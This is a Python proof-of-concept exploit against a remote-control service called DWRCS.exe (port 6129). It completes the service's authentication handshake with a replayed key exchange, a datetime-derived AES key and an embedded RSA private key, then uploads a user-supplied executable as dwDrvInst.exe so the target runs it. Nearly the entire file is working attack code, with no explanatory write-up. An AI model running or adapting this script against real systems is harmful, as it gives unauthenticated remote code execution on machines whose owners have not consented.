import sys, socket, os,string, binascii, argparse
from struct import *
from Crypto.Cipher import AES
from Crypto.Hash import HMAC,SHA512
from Crypto.Protocol import KDF 
from Crypto.Signature import PKCS1_v1_5
from Crypto.PublicKey import RSA

# Got it from the Internet 
def hexdump(src, length=16):
  DISPLAY = string.digits + string.letters + string.punctuation
  FILTER = ''.join(((x if x in DISPLAY else '.') for x in map(chr, range(256))))
  lines = []
  for c in xrange(0, len(src), length):
    chars = src[c:c+length]
    hex = ' '.join(["%02x" % ord(x) for x in chars])
    if len(hex) > 24:
      hex = "%s %s" % (hex[:24], hex[24:])
    printable = ''.join(["%s" % FILTER[ord(x)] for x in chars])
    lines.append("%08x:  %-*s  %s\n" % (c, length*3, hex, printable))
  return ''.join(lines)

def dump(title, data):
  print '--- [ %s ] --- ' % (title)
  print hexdump(data) 

def recvall(sock, n):
  data = ''
  while len(data) < n:
      packet = sock.recv(n - len(data))
      if not packet:
          return None
      data += packet
  return data

def xrecv(sock):
  data = ''
  # Read 0xc-byte header
  data = recvall(sock, 0xc)
  
  # Parse header 
  (type, unk, size) = unpack('<III', data)
 
  # Get data if any 
  if size:
    data += recvall(sock, size)

  return data


def aes_cbc_encrypt(data,key,iv):
  cipher = AES.new(key, AES.MODE_CBC, iv)
  return cipher.encrypt(data)

def aes_cbc_decrypt(data,key,iv):
  cipher = AES.new(key, AES.MODE_CBC, iv)
  return cipher.decrypt(data)


def int2bin(i):
  hs = format(i, 'x')
  if (len(hs) % 2):
    hs = '0' + hs
  return binascii.unhexlify(hs)



#
# MAIN
#
desc = 'This PoC attempts to upload and run a malicious dwDrvInst.exe.'

arg_parser = argparse.ArgumentParser(desc)
arg_parser.add_argument('-t', required=True, help='Target IP (Required)')
arg_parser.add_argument('-e', required=True, help='exe to send as dwDrvInst.exe (Required)')
arg_parser.add_argument('-p', type=int, default=6129, help='DWRCS.exe port, default: 6129')

args = arg_parser.parse_args()
host = args.t
port = args.p
exe  = args.e

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((host, port))

# Read MSG_TYPE_VERSION
res = s.recv(0x28)

(type,) = unpack_from('<I', res)
if type != 0x00001130:
  print 'Received message not MSG_TYPE_VERSION'
  s.clos()
  sys.exit(1)

# Send MSG_TYPE_VERSION, requesting smart card auth
req = pack('<I4sddIIII', 0x1130,'\x00',12.0,0.0,4,0,0,3)
s.sendall(req)

# Read MSG_CLIENT_INFORMATION_V7
res = recvall(s,0x3af8)
(type,) = unpack_from('<I', res)
if type != 0x00011171:
  print 'Received message not MSG_CLIENT_INFORMATION_V7'
  s.close()
  sys.exit(1)

#dump('server MSG_CLIENT_INFORMATION_V7', res)

# Pick out the datetime string
datetime = '' 
i = 8
b = res[i]
while(b != '\x00'):
  datetime += b 
  i = i + 2 
  b = res[i]

salt ='\x54\x40\xf4\x91\xa6\x06\x25\xbc' 
prf = lambda p,s: HMAC.new(p,s,SHA512).digest()
key = KDF.PBKDF2(datetime, salt, 16, 1000, prf) 
dump('Derived key from passwd ' + datetime, key)

#
# Send MSG_CLIENT_INFORMATION_V7
#
# Should be able to use the one sent by the server
req = res
s.sendall(req)

# Read MSG_TYPE_RSA_CRYPTO_C_INIT
res = recvall(s,0x1220)
(type,enc_len,) = unpack_from('<II', res)
if type != 0x000105b8:
  print 'Received message not MSG_TYPE_RSA_CRYPTO_C_INIT'
  s.close()
  sys.exit(1)

#dump('server MSG_TYPE_RSA_CRYPTO_C_INIT', res)

# Encrypted params at offset 0x100c
crypt = res[0x100c:0x100c+enc_len]
iv ='\x54\x40\xF4\x91\xA6\x06\x25\xBC\x8E\x84\x56\xD6\xCB\xB7\x40\x59'
params = aes_cbc_decrypt(crypt,key,iv)
dump('Encrypted server MSG_TYPE_RSA_CRYPTO_C_INIT params', crypt)
dump('Decrypted server MSG_TYPE_RSA_CRYPTO_C_INIT params', params)

# Send  MSG_TYPE_RSA_CRYPTO_C_INIT
# Should be able to use the one sent by the server
req = res
s.sendall(req)


# Read MSG_000105b9 (1)
res = recvall(s,0x2c2c)
(type,) = unpack_from('<I', res)
if type != 0x000105b9:
  print 'Received message not MSG_000105b9'
  s.close()
  sys.exit(1)

#dump('server MSG_000105b9 (1)', res)

# Get server DH public key
(pubkey_len,) = unpack_from('<I', res, 0x140c)
srv_pubkey = res[0x100c:0x100c+pubkey_len]
dump('server DH public key', srv_pubkey)
srv_pubkey = int(binascii.hexlify(srv_pubkey), base=16)

dh_prime = 0xF51FFB3C6291865ECDA49C30712DB07B
dh_gen = 3

clt_privkey = int(binascii.hexlify(os.urandom(16)), base=16) 

clt_pubkey  = int2bin(pow(dh_gen, clt_privkey, dh_prime))
dump('client DH public key', clt_pubkey)

shared_secret = int2bin(pow(srv_pubkey, clt_privkey, dh_prime))
dump('DH shared secret', shared_secret)

# Compute the sum of the bytes in the shared secret
clt_sum = 0
for b in shared_secret: clt_sum = clt_sum + ord(b)

buf = list(res);

# Send MSG_000105b9 (1)
# Fill in client DH public key and length 
buf[0x1418:0x1418+len(clt_pubkey)] = clt_pubkey
buf[0x1818:0x1818 + 4] = pack('<I',len(clt_pubkey))
req = ''.join(buf)
#dump('client MSG_000105b9 (1)', req)
s.sendall(req)

#
# Server send back the length and addsum of the shared secret
#
res = recvall(s,0x2c2c)
(type,) = unpack_from('<I', res)
if type != 0x000105b9:
  print 'Received message not MSG_000105b9'
  s.close()
  sys.exit(1)

#dump('server MSG_000105b9 (2)', res)

(srv_sum,) = unpack_from('<I', res, 0x1820)

# Byte sum of the shared secret should match on the client and server
print 'client-computed sum of the DH shared secret: 0x%x' % (clt_sum)
print 'server-computed sum of the DH shared secret: 0x%x' % (srv_sum)

#
#  1024-byte RSA key
# 
rsa_key  = "\x30\x82\x02\x5D\x02\x01\x00\x02\x81\x81\x00\xAD\x8C\x81\x7B\xC7"
rsa_key += "\x0B\xCA\xF7\x50\xBB\xD3\xA0\x7D\xC0\xA4\x31\xE3\xDD\x28\xCE\x99"
rsa_key += "\x78\x05\x92\x94\x41\x03\x85\xF5\xF0\x24\x77\x9B\xB1\xA6\x1B\xC7"
rsa_key += "\x9A\x79\x4D\x69\xAE\xCB\xC1\x5A\x88\xB6\x62\x9F\x93\xF5\x4B\xCA"
rsa_key += "\x86\x6C\x23\xAE\x4F\x43\xAC\x81\x7C\xD9\x81\x7E\x30\xB4\xCC\x78"
rsa_key += "\x6B\x77\xD0\xBB\x20\x1C\x35\xBE\x4D\x12\x44\x4A\x63\x14\xEC\xFC"
rsa_key += "\x9A\x86\xA2\x4F\x98\xB9\xB5\x49\x5F\x6C\x37\x08\xC0\x1D\xD6\x33"
rsa_key += "\x67\x97\x7C\x0D\x36\x62\x70\x25\xD8\xD4\xE8\x44\x61\x59\xE3\x61"
rsa_key += "\xCA\xB8\x9E\x14\x14\xAA\x2F\xCB\x89\x10\x1B\x02\x03\x01\x00\x01"
rsa_key += "\x02\x81\x81\x00\xA1\x60\xCF\x22\xD7\x33\x3B\x18\x00\x85\xB7\xC3"
rsa_key += "\x3C\x4C\x3F\x22\x79\x3D\xB4\xED\x70\x3D\xF0\x08\x9E\x3D\x5A\x56"
rsa_key += "\x5E\x1C\x60\xFC\xAB\xD5\x64\x9D\xDE\x5C\xE1\x41\x3F\xED\x9F\x60"
rsa_key += "\x7B\x9C\x36\xE4\xBC\x78\xEC\x16\xFF\x0B\x42\x51\x67\x8C\x23\x64"
rsa_key += "\xAC\xBF\xF8\xCB\xED\xE8\x46\x66\x40\x8F\x70\x46\x10\x9C\x63\x07"
rsa_key += "\x74\x33\x64\x26\x25\xA6\x34\x43\x8F\x95\xA9\x70\xD1\x40\x69\x0B"
rsa_key += "\xF8\xC8\x62\x5F\x8D\xE8\x8F\xC4\x46\xBF\x09\xAB\x83\x68\xFE\x5F"
rsa_key += "\x2D\x2D\x3B\xD9\xF5\xD5\x32\x34\xBC\x37\x17\xCB\x13\x50\x96\x6E"
rsa_key += "\x26\x82\xC2\x39\x02\x41\x00\xD9\x5D\x24\x6C\x3B\xA7\x85\x7F\xD9"
rsa_key += "\x6A\x7E\xDC\x4E\xDC\x67\x10\x1D\x6E\xAC\x19\xA9\xA3\xF7\xC0\x27"
rsa_key += "\x0A\xC3\x03\x94\xB5\x16\x54\xFC\x27\x3B\x41\xBC\x52\x80\x6B\x14"
rsa_key += "\x01\x1D\xAC\x9F\xC0\x04\xB9\x26\x01\x96\x68\xD8\xB9\x9A\xAD\xD8"
rsa_key += "\xA1\x96\x84\x93\xA2\xD8\xAF\x02\x41\x00\xCC\x65\x9E\xA8\x08\x7B"
rsa_key += "\xD7\x3D\x61\xD2\xB3\xCF\xC6\x4F\x0C\x65\x25\x1E\x68\xC6\xAC\x04"
rsa_key += "\xD0\xC4\x3A\xA7\x9E\xEB\xDE\xD9\x20\x9A\xCE\x92\x77\xB7\x84\xC0"
rsa_key += "\x1B\x42\xB4\xCA\xBE\xFC\x20\x88\x68\x2D\x0F\xC4\x6D\x44\x28\xA0"
rsa_key += "\x40\x0F\x88\x25\x08\x12\x51\x86\x42\x55\x02\x41\x00\xA4\x52\x0D"
rsa_key += "\x9E\xE4\xDA\x17\xCA\x37\x0A\x93\x2C\xE9\x51\x25\x78\xC1\x47\x51"
rsa_key += "\x43\x75\x43\x47\xA0\x33\xE3\xA6\xD9\xA6\x29\xDF\xE0\x0F\x5F\x79"
rsa_key += "\x24\x90\xC1\xAD\xE3\x45\x14\x32\xE2\xB5\x41\xEC\x50\x2B\xB3\x37"
rsa_key += "\x89\xBB\x8D\x54\xA9\xE8\x03\x00\x4E\xE9\x6D\x4A\x71\x02\x40\x4E"
rsa_key += "\x23\x73\x19\xCD\xD4\x7A\x1E\x6F\x2D\x3B\xAC\x6C\xA5\x7F\x99\x93"
rsa_key += "\x2D\x22\xE5\x00\x91\xFE\xB5\x65\xAE\xFA\xE4\x35\x17\x50\x8D\x9D"
rsa_key += "\xF7\x04\x69\x56\x08\x92\xE3\x57\x76\x42\xB8\xE4\x3F\x01\x84\x68"
rsa_key += "\x88\xB1\x34\xE3\x4B\x0F\xF2\x60\x1B\xB8\x10\x38\xB6\x58\xD9\x02"
rsa_key += "\x40\x65\xB1\xDE\x13\xAB\xAA\x01\x0D\x54\x53\x86\x85\x08\x5B\xC8"
rsa_key += "\xC0\x06\x7B\xBA\x51\xC6\x80\x0E\xA4\xD2\xF5\x63\x5B\x3C\x3F\xD1"
rsa_key += "\x30\x66\xA4\x2B\x60\x87\x9D\x04\x5F\x16\xEC\x51\x02\x9F\x53\xAA"
rsa_key += "\x22\xDF\xB4\x92\x01\x0E\x9B\xA6\x6C\x5E\x9D\x2F\xD8\x6B\x60\xD7"
rsa_key += "\x47"

#
# Public part of the RSA key
# 
rsa_pubkey  = "\x30\x81\x89\x02\x81\x81\x00\xAD\x8C\x81\x7B\xC7\x0B\xCA\xF7\x50"
rsa_pubkey += "\xBB\xD3\xA0\x7D\xC0\xA4\x31\xE3\xDD\x28\xCE\x99\x78\x05\x92\x94"
rsa_pubkey += "\x41\x03\x85\xF5\xF0\x24\x77\x9B\xB1\xA6\x1B\xC7\x9A\x79\x4D\x69"
rsa_pubkey += "\xAE\xCB\xC1\x5A\x88\xB6\x62\x9F\x93\xF5\x4B\xCA\x86\x6C\x23\xAE"
rsa_pubkey += "\x4F\x43\xAC\x81\x7C\xD9\x81\x7E\x30\xB4\xCC\x78\x6B\x77\xD0\xBB"
rsa_pubkey += "\x20\x1C\x35\xBE\x4D\x12\x44\x4A\x63\x14\xEC\xFC\x9A\x86\xA2\x4F"
rsa_pubkey += "\x98\xB9\xB5\x49\x5F\x6C\x37\x08\xC0\x1D\xD6\x33\x67\x97\x7C\x0D"
rsa_pubkey += "\x36\x62\x70\x25\xD8\xD4\xE8\x44\x61\x59\xE3\x61\xCA\xB8\x9E\x14"
rsa_pubkey += "\x14\xAA\x2F\xCB\x89\x10\x1B\x02\x03\x01\x00\x01"

rsa_privkey = RSA.importKey(rsa_key)
hash = SHA512.new(shared_secret)
signer = PKCS1_v1_5.new(rsa_privkey)
rsa_sig = signer.sign(hash)
dump('RSA signature of the DH shared secret', rsa_sig)

buf = list(res)
# Fill in the length and sum of the client-computed DH shared secret
buf[0x1410: 0x1410 + 4] = pack('<I',len(shared_secret))
buf[0x1414: 0x1414 + 4] = pack('<I',clt_sum) 

# Fill in the RSA signature of the DH shared secret 
buf[0x1824: 0x1824 + len(rsa_sig)] = rsa_sig
buf[0x2024: 0x2024 + 4] = pack('<I', len(rsa_sig))

# Fill in the RSA public key
buf[0x2028: 0x2028 + len(rsa_pubkey)] = rsa_pubkey
buf[0x2828: 0x2828 + 4] =  pack('<I', len(rsa_pubkey))

req = ''.join(buf)
#dump('client MSG_000105b9 (2)', req)
s.sendall(req)

# Server should send MSG_REGISTRATION_INFORMATION
res = recvall(s,0xc50)
(type,) = unpack_from('<I', res)
if type != 0x0000b004:
  print 'Received message not MSG_REGISTRATION_INFORMATION'
  s.close()
  sys.exit(1)

#dump('server MSG_REGISTRATION_INFORMATION', res)

# Send our MSG_REGISTRATION_INFORMATION
# Should be able to use the one sent by the server
req = res
s.sendall(req)

# Server should send MSG_SOCKET_ADD 
res = recvall(s,0x224)
(type,) = unpack_from('<I', res)
if type != 0x00010626:
  print 'Received message not MSG_SOCKET_ADD'
  s.close()
  sys.exit(1)

#dump('server MSG_SOCKET_ADD', res)

# Server should MSG_D6E2
res = recvall(s,0x1438)
(type,) = unpack_from('<I', res)
if type != 0x0000D6E2:
  print 'Received message not MSG_10626'
  s.close()
  sys.exit(1)

#dump('server MSG_D6E2', res)

# Send our MSG_D6E2
req = res
s.sendall(req)

# Server should send a MSG_SMARTCARD_COMMAND with no data part
res = xrecv(s)
(type,) = unpack_from('<I', res)
if type != 0x0000D6F6:
  print 'Received message not MSG_SMARTCARD_COMMAND'
  s.close()
  sys.exit(1)

#dump('server MSG_SMARTCARD_COMMAND', res)

# Server should send another MSG_SMARTCARD_COMMAND with no data part
res = xrecv(s)
(type,) = unpack_from('<I', res)
if type != 0x0000D6F6:
  print 'Received message not MSG_SMARTCARD_COMMAND'
  s.close()
  sys.exit(1)

#dump('server MSG_SMARTCARD_COMMAND', res)

# Send our dwDrvInst.exe with a MSG_SMARTCARD_COMMAND
print 'Sending malicious dwDrvInst.exe ...'
with open(exe,'rb') as f: data = f.read()
req = pack('<III', 0xD6F6,2, len(data))
req += data;
s.sendall(req)
print 'Please check if dwDrvInst.exe is launched on %s.\n' % (host)

# Any response?
print 'Checking any response from the server...'
res = s.recv(0x4000)
dump('Response after sending malicious dwDrvInst.exe', res)

